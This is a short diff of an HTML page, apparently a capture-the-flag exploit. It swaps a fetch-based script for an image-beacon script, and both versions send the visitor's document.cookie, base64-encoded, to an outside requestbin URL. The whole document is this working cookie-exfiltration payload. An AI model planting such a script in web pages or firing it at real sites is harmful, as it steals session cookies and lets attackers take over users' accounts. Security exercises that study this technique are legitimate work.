@@ -6,9 +6,10 @@
 </head>
 
 <body>
-  <script>
-    fetch("https://requestbin.whapi.cloud/1c0vt2z1?flag=" + btoa(document.cookie)).then((response) => console.log(response));
-  </script>
+	<img id="myimg"/>
+	<script>
+		document.getElementById("myimg").src = "https://requestbin.whapi.cloud/1c0vt2z1?cookie=" + btoa(document.cookie);
+	</script>
 </body>
 
 </html>
